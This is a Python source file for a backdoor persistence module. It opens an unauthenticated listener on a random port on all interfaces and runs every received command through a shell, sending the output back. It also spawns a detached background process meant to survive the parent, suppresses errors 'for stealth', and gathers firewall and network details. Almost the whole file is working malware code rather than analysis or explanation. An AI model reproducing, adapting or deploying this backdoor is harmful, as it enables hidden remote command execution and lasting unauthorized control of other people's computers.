import socket
import threading
import time
import random
from datetime import datetime
import subprocess
import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

class PersistentChannel:
    """Simple independent backdoor persistence - no external server needed"""

    def __init__(self, listen_port=None):
        self.listen_port = listen_port  # Will be set to random port
        self.is_running = False
        self.channel_socket = None
        self.channel_thread = None
        self.persistence_process = None  # For standalone process
        self.connections = {}  # Track active connections
        self.connection_count = 0
        self.start_time = None
        
    def create_stealth_socket(self):
        """Create socket with stealth configurations"""
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Socket options for stealth
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Try to bind to the port
            sock.bind(('0.0.0.0', self.listen_port))
            sock.listen(5)
            
            return sock
        except Exception as e:
            return None
    
    def handle_client_connection(self, client_socket, client_address):
        """Handle client connection directly - execute commands locally"""
        connection_id = f"conn_{self.connection_count}"
        self.connection_count += 1
        
        print(f"[PERSISTENCE] Client connected: {client_address}")
        
        try:
            # Store connection info
            self.connections[connection_id] = {
                'client_addr': client_address,
                'start_time': datetime.now(),
                'commands_executed': 0
            }
            
            # Handle client commands directly
            while True:
                try:
                    # Receive command from client
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    
                    # Parse JSON command
                    try:
                        command = data.decode().strip()
                        
                        # Remove JSON quotes if present
                        if command.startswith('"') and command.endswith('"'):
                            command = command[1:-1]
                        
                        print(f"[PERSISTENCE] Executing command: {command}")
                        
                        # Execute command directly on Windows
                        if command.lower() == 'quit' or command.lower() == 'exit':
                            response = "Goodbye!"
                            client_socket.send(response.encode())
                            break
                        else:
                            # Execute the command
                            try:
                                result = subprocess.run(
                                    command,
                                    shell=True,
                                    capture_output=True,
                                    text=True,
                                    timeout=30
                                )
                                
                                # Get output
                                output = result.stdout + result.stderr
                                
                                if output.strip():
                                    response = output.strip()
                                else:
                                    response = "Command executed successfully (no output)"
                                    
                                # Update connection stats
                                self.connections[connection_id]['commands_executed'] += 1
                                
                            except subprocess.TimeoutExpired:
                                response = "Command timed out after 30 seconds"
                            except Exception as e:
                                response = f"Command execution error: {str(e)}"
                        
                        # Send response back to client
                        client_socket.send(response.encode())
                        print(f"[PERSISTENCE] Response sent ({len(response)} bytes)")
                        
                    except Exception as e:
                        error_response = f"Error processing command: {str(e)}"
                        client_socket.send(error_response.encode())
                        print(f"[PERSISTENCE] Command error: {e}")
                        
                except Exception as e:
                    print(f"[PERSISTENCE] Connection error: {e}")
                    break
            
        except Exception as e:
            print(f"[PERSISTENCE] Client error: {e}")
        finally:
            # Clean up client socket
            try:
                client_socket.close()
            except:
                pass
            if connection_id in self.connections:
                del self.connections[connection_id]
            print(f"[PERSISTENCE] Client disconnected: {client_address}")
    
    # Removed complex forwarding - now handling commands directly
    
    def persistence_server_loop(self):
        """Main persistence server loop"""
        try:
            self.channel_socket = self.create_stealth_socket()
            if not self.channel_socket:
                return
            
            self.is_running = True
            self.start_time = datetime.now()
            
            while self.is_running:
                try:
                    # Accept connections with timeout
                    self.channel_socket.settimeout(1.0)
                    client_socket, client_address = self.channel_socket.accept()
                    
                    # Handle connection in separate thread (NOT daemon - for permanence)
                    connection_thread = threading.Thread(
                        target=self.handle_client_connection,
                        args=(client_socket, client_address),
                        daemon=False
                    )
                    connection_thread.start()
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.is_running:
                        time.sleep(1)  # Brief pause before retry
                        
        except Exception as e:
            pass  # Silent failure for stealth
        finally:
            if self.channel_socket:
                try:
                    self.channel_socket.close()
                except:
                    pass
    
    def start_persistence_channel(self):
        """Start the persistence channel as standalone process"""
        if self.is_running:
            return False, "persistence channel already running"
        
        try:
            # Get path to standalone proxy script (in same features folder)
            current_dir = os.path.dirname(os.path.abspath(__file__))
            standalone_script = os.path.join(current_dir, "standalone_process.py")
            
            # Start standalone proxy process (survives even when backdoor.py stops)
            python_exe = sys.executable
            cmd = [python_exe, standalone_script, str(self.listen_port)]
            
            # Debug: Check if script exists
            if not os.path.exists(standalone_script):
                return False, f"Standalone script not found: {standalone_script}"
            
            # Start process in background (detached from parent)
            if os.name == 'nt':  # Windows
                # Use DETACHED_PROCESS and CREATE_NEW_PROCESS_GROUP for full independence
                self.persistence_process = subprocess.Popen(
                    cmd,
                    creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL
                )
            else:  # Unix-like
                self.persistence_process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL,
                    preexec_fn=os.setsid  # Create new session
                )
            
            # Give it a moment to start
            time.sleep(1)
            
            # Test if port is now listening
            test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_socket.settimeout(2)
            try:
                result = test_socket.connect_ex(('localhost', self.listen_port))
                test_socket.close()
                
                if result == 0:
                    self.is_running = True
                    return True, f"permanent persistence started on port {self.listen_port} (PID: {self.persistence_process.pid})"
                else:
                    return False, f"Failed to connect to persistence on port {self.listen_port}"
            except:
                return False, "Failed to test persistence connection"
                
        except Exception as e:
            return False, f"Failed to start standalone persistence: {str(e)}"
    
    # Removed stop and status methods - persistence runs permanently
    



class PersistenceManager:
    """Manage persistence mechanisms for the hidden channel"""
    
    def __init__(self, channel_instance):
        self.channel = channel_instance
    
    def check_firewall_status(self):
        """Check Windows firewall status (informational)"""
        try:
            result = subprocess.run(
                ['netsh', 'advfirewall', 'show', 'allprofiles', 'state'],
                capture_output=True, text=True, timeout=10
            )
            return result.returncode == 0, result.stdout
        except Exception as e:
            return False, str(e)
    
    def check_port_usage(self, port=None):
        """Check if port is already in use"""
        if port is None:
            port = self.channel.listen_port
            
        try:
            result = subprocess.run(
                ['netstat', '-an'],
                capture_output=True, text=True, timeout=5
            )
            
            if result.returncode == 0:
                port_str = f":{port}"
                lines = result.stdout.split('\n')
                for line in lines:
                    if port_str in line and 'LISTENING' in line:
                        return True, f"Port {port} is already in use"
                
                return False, f"Port {port} is available"
            else:
                return None, "Could not check port status"
                
        except Exception as e:
            return None, f"Error checking port: {str(e)}"
    
    def find_available_port(self, start_port=8000, end_port=9999):
        """Find an available port in the given range"""
        for port in range(start_port, end_port + 1):
            in_use, msg = self.check_port_usage(port)
            if in_use == False:  # Port is available
                return port
        
        return None
    
    def get_network_info(self):
        """Get network interface information"""
        try:
            result = subprocess.run(
                ['ipconfig', '/all'],
                capture_output=True, text=True, timeout=10
            )
            
            if result.returncode == 0:
                return True, result.stdout
            else:
                return False, "Could not retrieve network info"
                
        except Exception as e:
            return False, f"Network info error: {str(e)}"


class BackdoorPersistence:
    """Main manager for backdoor persistence operations"""
    
    def __init__(self):
        # Simple approach - no external target needed
        self.channel = None
        self.proxy_mgr = None
    
    def initialize_persistence(self, listen_port=None):
        """Initialize the persistence channel"""
        self.channel = PersistentChannel(listen_port)
        self.persistence_mgr = PersistenceManager(self.channel)
        
        # Find available port if none specified
        if listen_port is None:
            # Try random ports until we find an available one
            max_attempts = 10
            for attempt in range(max_attempts):
                random_port = random.randint(8000, 9999)
                in_use, port_msg = self.persistence_mgr.check_port_usage(random_port)
                if in_use == False:  # Port is available
                    self.channel.listen_port = random_port
                    break
            else:
                # If no random port found, use find_available_port as fallback
                available_port = self.persistence_mgr.find_available_port()
                if available_port:
                    self.channel.listen_port = available_port
                else:
                    return False, "No available ports found"
        
        return True, f"persistence initialized on port {self.channel.listen_port}"
    
    def start_persistence_operations(self):
        """Start persistence operations with automatic new random port selection"""
        # Always reinitialize with a new random port for better stealth
        success, msg = self.initialize_persistence()
        if not success:
            return False, msg
        
        # Start the persistence channel
        return self.channel.start_persistence_channel()
    
    # Removed stop and status methods - persistence runs permanently
    



# Factory function to create backdoor proxy manager
def create_backdoor_persistence():
    """Create backdoor persistence manager instance"""
    return BackdoorPersistence()


# Test the persistence functionality
if __name__ == "__main__":
    print("Testing Backdoor Persistence System...")
    
    # Create persistence manager
    persist_mgr = create_backdoor_persistence()
    
    # Initialize persistence
    success, msg = persist_mgr.initialize_persistence()
    print(f"Initialize: {msg}")
    
    if success:
        print(f"\nTesting persistence start...")
        success, msg = persist_mgr.start_persistence_operations()
        print(f"Start result: {msg}")
        
        if success:
            print(f"\nPersistence started successfully!")
            print(f"Process will run permanently in background.")
        else:
            print(f"Failed to start persistence: {msg}")
    
    print("\nPersistence test completed!")
